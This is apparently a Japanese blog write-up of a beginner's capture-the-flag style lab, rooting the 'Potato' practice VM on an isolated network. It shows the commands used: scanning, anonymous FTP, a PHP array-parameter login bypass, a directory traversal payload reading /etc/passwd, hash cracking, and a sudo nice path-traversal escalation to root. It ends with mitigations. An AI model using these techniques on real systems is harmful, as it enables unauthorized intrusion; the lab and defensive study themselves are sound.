---
title: "初学者が仮想マシンのroot権限を奪取するまで"
emoji: "🌊"
type: "tech"
topics: ["security", "hacking", "php", "cybersecurity"]
published: true
---

## はじめに
こんにちは、rainwaterと申します。
普段は大学でハードウェアを主に学んでいますが、ふとしたきっかけからセキュリティ分野に興味を持ち、より深い理解を目指すために独学で学習を進めています。

今回は、仮想環境上のやられサーバーに対して、攻撃機から脆弱性を突き、root権限を奪取するまでの過程を記録します。

:::message alert
本記事は、自身の管理下にある閉じた仮想ネットワーク内での実験記録です。
許可のない第三者のサーバーやネットワークに対して同様の行為を行うことは、不正アクセス禁止法により処罰の対象となります。絶対に悪用しないでください。
:::

*本記事では煩雑である上趣旨からそれるため、VirtualBoxを用いた仮想環境の構築については割愛します。

## 環境構成
今回の実験環境は以下の通りです。

* **ホストOS:** Windows 11
* **仮想化ソフト:** Oracle VM VirtualBox 7.0
* **攻撃機:** Parrot Security OS 5.3 (IP: 192.168.56.100)
* **ターゲット:** Potato(仮想マシン) 
* **ネットワーク:** NATネットワーク（外部から隔離）

## 攻撃のステップ

### 1. 偵察
    まずは、攻撃機自身のIPアドレスとネットワークの情報を確認するために`ip a`コマンドを実行しました。
```bash
┌─[user@parrot]─[~]
└──╼ $ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:61:06:03 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.103/24 brd 192.168.56.255 scope global dynamic noprefixroute enp0s3
       valid_lft 578sec preferred_lft 578sec
    inet6 fe80::d026:3205:3a6f:1e80/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:eb:fe:3b brd ff:ff:ff:ff:ff:ff
    inet 10.0.3.15/24 brd 10.0.3.255 scope global dynamic noprefixroute enp0s8
       valid_lft 63501sec preferred_lft 63501sec
    inet6 fd17:625c:f037:3:73b8:de8:cc9c:a4a5/64 scope global dynamic noprefixroute 
       valid_lft 86326sec preferred_lft 14326sec
    inet6 fe80::22b3:9526:c737:f1bd/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

結果から、ターゲットが接続されていると推測される隔離された仮想ネットワークのインターフェースが`enp0s3`（IP帯：192.168.56.0/24）であることが分かりました。
続けて、このネットワーク内に存在するターゲット端末のIPアドレスを特定するために、`netdiscover`を用いてARPスキャンを行いました。
```bash
 ┌─[user@parrot]─[~]
└──╼ $sudo netdiscover -i enp0s3 -r 192.168.56.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts                 
                                                                               
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0d      1      60  Unknown vendor              
 192.168.56.100  08:00:27:52:ee:2e      1      60  PCS Systemtechnik GmbH      
 192.168.56.102  08:00:27:4f:24:ec      1      60  PCS Systemtechnik GmbH 
```

スキャンの結果、Windows11とParrotOS自身のIPアドレスを除外すると残る192.168.56.102がPotatoのIPアドレスであると特定できました。
Pingで疎通確認を行ったところ、無事開通できていることも分かりました。

### 2. 脆弱性の特定
脆弱性を探るために、NmapでPotatoをポートスキャンしました。

```bash
┌─[✗]─[user@parrot]─[~]
└──╼ $sudo nmap -sC -sV -Pn -p- 192.168.56.102
...
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA)
|   256 f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b (ECDSA)
|_  256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Potato company
|_http-server-header: Apache/2.4.41 (Ubuntu)
2112/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
...
```

ポート22,80,2112が開いていることが判明しました。
このうちポート2112はFTPサービスであることがスキャンにより分かり、攻撃の足掛かりになりそうです。
さらに、ポート22はSSHとしてログイン可能であることも、何かに使えそうです。

### 3. FTP

まずは実際にFTPにログインしてみました。
先のスキャンで`Anonymous FTP login allowed`と書かれており、ユーザー名を"anonymous"にするとAnonymous FTPとしてログインできることが分かります。このとき、パスワードは任意の文字列で構いません。
```bash
┌─[user@parrot]─[~]
└──╼ $ftp 192.168.56.102 2112
Connected to 192.168.56.102.
220 ProFTPD Server (Debian) [::ffff:192.168.56.102]
Name (192.168.56.102:user): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
...
ftp> 
```

無事ログインできました。
lsコマンドでファイル一覧を表示し、"index.php.bak"と"welcome.msg"というファイルがあることが分かったので、getコマンドでダウンロードしました。

中身を見てみると、welcome.msgは単なるメッセージでしたがindex.php.bakはHTMLを含むソースコードらしき内容でした。
```bash
┌─[✗]─[user@parrot]─[~]
└──╼ $cat index.php.bak
<html>
...
$pass= "potato"; //note Change this password regularly
...
```
デフォルトパスワードが書かれています。これが有効であるか、直接Webサイトに確認しに行きました。

### 4. Burp Suiteを用いたWebサイトへのログイン
hXXp://192.168.56[.]102 にアクセスしたところ、次のようなページが表示されました。
![](https://storage.googleapis.com/zenn-user-upload/007a34aeef6c-20260219.png)
特にパスワード入力のような画面はないため、別のディレクトリに入力欄があることが予想されます。

ディレクトリを探るために、Gobusterというツールを利用しました。
```bash
┌─[✗]─[user@parrot]─[~]
└──╼ $gobuster dir -u http://192.168.56.102/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
...
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 279]
/admin                (Status: 301) [Size: 316] [--> http://192.168.56.102/admin/]
/.hta                 (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 245]
/server-status        (Status: 403) [Size: 279]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

\admin ディレクトリが見つかったので、アクセスします。

![](https://storage.googleapis.com/zenn-user-upload/e1af9992415f-20260219.png)

無事ログイン画面を表示させることに成功しました。

ユーザー名admin、パスワードは先ほど見つけたデフォルトパスワードのPotatoでログインを試みました。

![](https://storage.googleapis.com/zenn-user-upload/d1485bfe8f24-20260222.png)

残念ながらデフォルトパスワードから変更されているようでしたので、ログインはできませんでした。
別の手段を考えると、総当たりでも突破はできそうです。しかし、今回は学習目的ですので違う方法のほうが適切であると判断しました。
そこで、Burp Suiteを用いてHTTPリクエストを書き換えてみました。

書き換える前のリクエストは以下の通りでした。
```bash
POST /admin/index.php?login=1 HTTP/1.1
Host: 192.168.56.102
...
username=admin&password=hogehoge

(パスワードは適当な文字列を入力しました)
```

これを少し書き換え、パスワードの文字型を配列にしました。
```bash
POST /admin/index.php?login=1 HTTP/1.1
Host: 192.168.56.102
...
username=admin&password[]=hogehoge
```

入力した値（hogehoge）は文字列であるため配列とは比較が成立しませんが、古いPHPでは処理が破綻すると戻り値としてNULLを返し、それを評価した際に結果がTrueとなってしまう致命的な仕様があります。今回はその脆弱性をつけるか試しています。

結果、侵入に成功しました！

### 5. ディレクトリトラバーサル攻撃とパスワードの解析

アドミンエリアを見てみるとlogを入手できるディレクトリがあったので、ここから更なる攻撃ができるか試しました。
![](https://storage.googleapis.com/zenn-user-upload/5bf61e2699ba-20260222.png)

ログを入手する際のHTTPリクエストは以下の通りでした。
```bash
POST /admin/dashboard.php?page=log HTTP/1.1
Host: 192.168.56.102
...
Connection: keep-alive

file=log_01.txt
```
入手するファイルのディレクトリを変更し、意図されていないファイルを入手できるか試しました。
ここで、ディレクトリートラバーサル攻撃と呼ばれる手法を利用しました。入手するファイル名に`../`を含めることでそのファイルの上位の階層へ遡り、任意のディレクトリのファイルを入手する攻撃手法です。

今回は`../`が一つだと階層が浅すぎてうまくいかなかったので、徐々に追加していき最終的に`../../../../../etc/passwd `というリクエストを送信しました。
すると、以下のように本来logが表示される場所にパスワードを含んだ大量の文字列を表示させることができました。

![](https://storage.googleapis.com/zenn-user-upload/c66c511cdbe5-20260219.png)


このパスワードをよく見ると、
- `root:x:0:0:root:/root:/bin/bash`
- `florianges:x:1000:1000:florianges:/home/florianges:/bin/bash`
- `webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash`


と書かれており、3つのユーザーがあることが分かります。しかし、rootユーザーとfloriangesユーザーはきちんとパスワードハッシュがシャドウ化されており(Xになっており)、侵入が難しいです。
しかし、webadminユーザーのパスワードハッシュを入手することに成功しました。それを解析することで侵入を試みました。

解析にはJohn the Ripperというオフラインパスワードクラッカーを用いました。
```bash
┌─[user@parrot]─[~]
└──╼ $john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
...
Press 'q' or Ctrl-C to abort, almost any other key for status
dragon           (webadmin)     
...
```

webadminユーザーのパスワードが"dragon"であることが分かりました。ここで、`hash.txt`は先ほどのパスワードハッシュをテキストファイルにしたもの、`rockyou.txt`はParrotOSに収録されている主要なパスワードリストです。

ここで、最初に行ったNmapの結果で22番ポートが開いていたことを思い出します。前述したように22番ポートはSSHとしてログインが可能であり、ここからwebadminユーザーとして侵入できるか試みました。

```bash
┌─[✗]─[user@parrot]─[~/hacking-lab-portfolio/potato_vol2]
└──╼ $ssh webadmin@192.168.56.102
webadmin@192.168.56.102's password: dragon
...

Last login: Tue Feb 17 12:16:58 2026 from 192.168.56.103
webadmin@serv:~$ 
```
侵入に成功しました。

### 6. webadminユーザーとしての解析

lsコマンドでディレクトリの中身を確認すると、`user.txt`が存在することが分かったので、中身を見てみます。
解読不能の文字列でしたが、使用されている文字の種類からbase64でエンコードされたものであると推測し、デコードしてみるとフランス語のような文章が読み取れました。
```bash
webadmin@serv:~$ la -la
total 32
drwxr-xr-x 3 webadmin webadmin 4096 Aug  2  2020 .
drwxr-xr-x 4 root     root     4096 Aug  2  2020 ..
...
-rw------- 1 webadmin root       69 Aug  2  2020 user.txt

webadmin@serv:~$ cat user.txt
TGUgY29udHLDtGxlIGVzdCDDoCBwZXUgcHLDqHMgYXVzc2kgcsOpZWwgcXXigJl1bmUg

webadmin@serv:~$ cat user.txt | base64 -d
Le contrôle est à peu près aussi réel qu’une 
```
和訳すると「その管理は、ほぼ現実のものと言える。」だそうで、励ましの言葉であることが推測されます。
ありがたいですが次の攻撃にはつながらないので、別の手段を講じます。先ほどのパスワード解析で`florianges`ユーザーが存在することが判明しているので、そのディレクトリの中身を覗きました。

```bash
webadmin@serv:~$ cd ..
webadmin@serv:/home$ ls
florianges  webadmin

webadmin@serv:/home$ cd florianges
webadmin@serv:/home/florianges$ ls -la
total 28
drwxr-xr-x 3 florianges florianges 4096 Aug  2  2020 .
drwxr-xr-x 4 root       root       4096 Aug  2  2020 ..
-rw------- 1 florianges florianges   38 Aug  2  2020 .bash_history
-rw-r--r-- 1 florianges florianges  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 florianges florianges 3771 Feb 25  2020 .bashrc
drwx------ 2 florianges florianges 4096 Aug  2  2020 .cache
-rw-r--r-- 1 florianges florianges  807 Feb 25  2020 .profile
-rw-r--r-- 1 florianges florianges    0 Aug  2  2020 .sudo_as_admin_successful

```
`.sudo_as_admin_successful`ファイルが存在していることが分かりました。
先のパスワード解析でfloriangesユーザーはパスワードハッシュがシャドウ化されていることが分かっているので、shadowファイルを見ることを試みました。

```bash
webadmin@serv:/home/florianges$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1218 Aug  2  2020 /etc/shadow
webadmin@serv:/home/florianges$ cat /etc/shadow
cat: /etc/shadow: Permission denied
```
残念ながら権限が無いようでした。floriangesユーザーとしてログインすることは諦めて、webadminユーザーのまま攻撃方法が無いか探るため、sudo権限で何ができるか確認しました。
```bash
webadmin@serv:/home/florianges$ sudo -l
[sudo] password for webadmin: dragon
...
User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*
```

webadminユーザーは`bin/nice`コマンドを`/notes`ディレクトリ以下のファイルを指定して実行できることが分かりました。
`bin/nice`が未知のコマンドだったので`man`コマンドでマニュアルを表示すると、プログラムの実行優先度を変更するコマンドであることが分かりました。

また、`/notes`ディレクトリの内部を見てみると、
```bash
webadmin@serv:/notes$ ls -la
total 16
drwxr-xr-x  2 root root 4096 Aug  2  2020 .
drwxr-xr-x 21 root root 4096 Aug  2  2020 ..
-rwx------  1 root root   11 Aug  2  2020 clear.sh
-rwx------  1 root root    8 Aug  2  2020 id.sh

webadmin@serv:/notes$ cat clear.sh
cat: clear.sh: Permission denied
webadmin@serv:/notes$ cat id.sh
cat: id.sh: Permission denied
```
と、2つのファイルが存在しましたが、内容を確認する権限がありませんでした。
そこで実際に`nice`コマンドを使ってみました。

```bash
webadmin@serv:/notes$ sudo /bin/nice /notes/id.sh
uid=0(root) gid=0(root) groups=0(root)
```
この結果は、ルート権限でidスクリプトを実行した結果と非常に近しく、`nice`コマンドはルート権限を持っていることが予想されます。

再びディレクトリトラバーサル攻撃を仕掛け、`/notes`ディレクトリから脱出することを試みます。
```bash
webadmin@serv:/notes$ sudo /bin/nice /notes/../bin/bash
root@serv:/notes#
```
root権限を奪取することに成功しました！
最後に、フラグファイルの確認とダウンロードを行いました。
```bash
root@serv:/notes# cd ~
root@serv:~# ls
root.txt  snap
root@serv:~# cat root.txt
bGljb3JuZSB1bmlqYW1iaXN0ZSBxdWkgZnVpdCBhdSBib3V0IGTigJl1biBkb3VibGUgYXJjLWVuLWNpZWwuIA==
root@serv:~# cat root.txt | base64 -d
licorne unijambiste qui fuit au bout d'un double arc-en ciel.
```
```bash
root@serv:~# cp /root/root.txt /tmp/root.txt
//tmpディレクトリにroot.txtを移動させる

root@serv:~# chmod 777 /tmp/root.txt
//管理者権限が無くてもファイルの閲覧を可能にする

┌─[✗]─[user@parrot]─[~2]
└──╼ $scp webadmin@192.168.56.102:/tmp/root.txt .
webadmin@192.168.56.102's password: 
root.txt                                      100%   89     5.3KB/s   00:00  
//ParrotOSに戻り、ダウンロード
```
ちなみに、root.txtの内容を和訳すると、「片足のユニコーンが二重の虹の向こうへ逃げていく。」でした。

## 考察

今回攻撃対象にしたPotatoマシンには様々な脆弱性がありましたが、特に致命的だと感じたのは

- 古いPHPを用いていたため、パスワードが分からずともadminに侵入できたこと
- webadminユーザーのパスワードハッシュをシャドウ化していなかったこと
- ディレクトリトラバーサル攻撃の対策をしていなかったこと

です。

### PHPについて
改めて、この脆弱性の原因は「PHPの文字列比較関数(`strcmp`等)がエラーが起きるとNULLを返し、それに対し`==`という緩やかな比較を行うとTrueを返してしまう」ことです。

#### 想定されるリスク
管理者権限が不正に奪取されることで、Webサイトの改ざんやデータベース内の顧客情報の漏洩に直結します。

#### 具体的な防御手法
この対策として、より厳密な比較である`===`を用いることが挙げられます。
```php
if (is_string($_POST['password']) && $_POST['password'] === $password) {
    // 認証成功の処理
} else {
    // 認証失敗の処理
}
```
また、PHP自体のバージョンを最新のセキュアなものへアップデートすることも必須です。

### パスワードハッシュのシャドウ化について
本実験ではパスワードハッシュがシャドウ化されていないことによって、オフラインパスワードクラッカーを用いてパスワードを解析され、空いていたSSHのポートからログインされてしまいました。

#### 想定されるリスク
従業員やシステム管理者のアカウントで内部ネットワークに侵入されると、そこを踏み台にして社内の他のサーバーへと続けて攻撃されるリスクがあります。

#### 具体的な防御手段
パスワードは必ず`pwconv`コマンド等を用いてシャドウパスワード化し、一般ユーザーから閲覧できない状態にする必要があります。

### ディレクトリトラバーサル攻撃について
ユーザーからの入力をそのままファイルパスとして処理してしまっていたため、`../`を入力することで別の階層のファイルを読み込まれてしまいました。

#### 想定されるリスク
サーバー内の任意のファイルが閲覧可能になることで、システムの設定ファイルやソースコード、他のサービスの認証情報などが外部に流出してしまいます。

#### 具体的な防御手法
ユーザーの入力という未知の値を直接ファイルパスと結合せず、純粋なファイル名のみを抽出するサニタイズ処理を行います。PHPであれば basename() 関数を用いて入力値からディレクトリのパス要素を排除します。
```php
$file = basename($_GET['file']);
include("/var/www/html/logs/" . $file);
```
この「ユーザーからの入力は無害化してから処理に組み込む」という考え方は、SQLインジェクションやXSSといった攻撃を防ぐことにも繋がります。

## まとめ
今回はセキュリティの理解を深めるため、実際に攻撃を行ってみました。知識自体は持っていた攻撃方法でも実際に行ってみると学びが多く、実験を行っていて非常に楽しめました。
これからもこのような記事、具体的にはMetasploitを用いた実験やWebに寄った実験の記事も書いていきたいです。

*本記事はIPUSORON氏 著「ハッキング・ラボのつくりかた 完全版」を大いに参考にさせていただいています。